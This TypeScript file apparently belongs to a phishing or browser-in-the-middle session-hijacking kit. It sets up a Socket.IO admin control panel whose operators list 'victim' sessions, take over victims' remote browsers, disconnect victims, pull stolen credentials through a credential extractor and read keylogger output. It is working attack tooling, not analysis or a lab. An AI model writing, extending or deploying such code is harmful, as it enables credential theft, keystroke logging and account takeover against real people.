import type { Namespace, Socket } from 'socket.io';
import { SessionManager } from '../../services/SessionManager.js';
import { BrowserPoolManager } from '../../services/BrowserPoolManager.js';
import { CredentialExtractor } from '../../services/CredentialExtractor.js';
import { KeyloggerService } from '../../services/KeyloggerService.js';
import { config } from '../../config/config.js';
import { logger } from '../../utils/logger.js';

export function setupAdminNamespace(
  namespace: Namespace,
  sessionManager: SessionManager,
  browserPoolManager: BrowserPoolManager,
  credentialExtractor: CredentialExtractor,
  keyloggerService: KeyloggerService
): void {
  namespace.on('connection', (socket: Socket) => {
    const clientIp = socket.handshake.address;
    logger.info(`Admin connected: ${socket.id} from ${clientIp}`);

    // Check IP whitelist
    if (!config.admin.allowedIps.includes(clientIp) && !config.admin.allowedIps.includes('*')) {
      logger.warn(`Unauthorized admin access attempt from ${clientIp}`);
      socket.emit('error', { message: 'Unauthorized IP address' });
      socket.disconnect();
      return;
    }

    // Handle authentication (simple socket key check for now)
    socket.on('auth', (data: { key: string }) => {
      if (data.key === config.admin.socketKey) {
        socket.join('admin_room');
        socket.emit('auth:success');
        logger.info(`Admin ${socket.id} authenticated successfully`);

        // Send initial session list
        const sessions = sessionManager.getActiveSessions();
        socket.emit('sessions:list', sessions);
      } else {
        socket.emit('auth:failed', { message: 'Invalid authentication key' });
        logger.warn(`Admin ${socket.id} authentication failed`);
      }
    });

    // Handle session list request
    socket.on('sessions:list', () => {
      if (!socket.rooms.has('admin_room')) {
        socket.emit('error', { message: 'Not authenticated' });
        return;
      }

      const sessions = sessionManager.getActiveSessions();
      socket.emit('sessions:list', sessions);
    });

    // Handle session takeover
    socket.on('session:takeover', async (data: { browserId: string; viewport: { width: number; height: number } }) => {
      if (!socket.rooms.has('admin_room')) {
        socket.emit('error', { message: 'Not authenticated' });
        return;
      }

      try {
        const session = sessionManager.getSessionByBrowserId(data.browserId);
        if (!session) {
          socket.emit('error', { message: 'Session not found' });
          return;
        }

        await sessionManager.setAdminSocket(session.id, socket.id);
        socket.emit('session:takeover:success', { sessionId: session.id });
        logger.info(`Admin ${socket.id} took control of session ${session.id}`);
      } catch (error) {
        logger.error(`Error taking over session:`, error);
        socket.emit('error', { message: 'Failed to take over session' });
      }
    });

    // Handle session release
    socket.on('session:release', async (data: { browserId: string }) => {
      if (!socket.rooms.has('admin_room')) {
        socket.emit('error', { message: 'Not authenticated' });
        return;
      }

      try {
        const session = sessionManager.getSessionByBrowserId(data.browserId);
        if (session) {
          await sessionManager.releaseAdminControl(session.id);
          socket.emit('session:release:success', { sessionId: session.id });
          logger.info(`Admin ${socket.id} released control of session ${session.id}`);
        }
      } catch (error) {
        logger.error(`Error releasing session:`, error);
        socket.emit('error', { message: 'Failed to release session' });
      }
    });

    // Handle session boot
    socket.on('session:boot', async (data: { browserId: string }) => {
      if (!socket.rooms.has('admin_room')) {
        socket.emit('error', { message: 'Not authenticated' });
        return;
      }

      try {
        const session = sessionManager.getSessionByBrowserId(data.browserId);
        if (session) {
          // Disconnect victim
          namespace.server.of('/victim').to(session.victimSocketId).disconnectSockets();

          // Cleanup
          await browserPoolManager.releaseBrowser(data.browserId);
          await keyloggerService.closeKeylog(session.id);
          await sessionManager.terminateSession(session.id);

          socket.emit('session:boot:success', { sessionId: session.id });
          logger.info(`Admin ${socket.id} booted session ${session.id}`);
        }
      } catch (error) {
        logger.error(`Error booting session:`, error);
        socket.emit('error', { message: 'Failed to boot session' });
      }
    });

    // Handle credential extraction
    socket.on('credentials:extract', async (data: { browserId: string }) => {
      if (!socket.rooms.has('admin_room')) {
        socket.emit('error', { message: 'Not authenticated' });
        return;
      }

      try {
        const credentials = await credentialExtractor.extractCredentials(data.browserId);
        socket.emit('credentials:result', {
          browserId: data.browserId,
          credentials,
        });
        logger.info(`Credentials extracted from browser ${data.browserId}`);
      } catch (error) {
        logger.error(`Error extracting credentials:`, error);
        socket.emit('error', { message: 'Failed to extract credentials' });
      }
    });

    // Handle keylog request
    socket.on('keylog:get', (data: { sessionId: string }) => {
      if (!socket.rooms.has('admin_room')) {
        socket.emit('error', { message: 'Not authenticated' });
        return;
      }

      const keylog = keyloggerService.getKeylog(data.sessionId);
      socket.emit('keylog:result', {
        sessionId: data.sessionId,
        keylog,
      });
    });

    // Handle disconnect
    socket.on('disconnect', () => {
      logger.info(`Admin disconnected: ${socket.id}`);
    });
  });
}

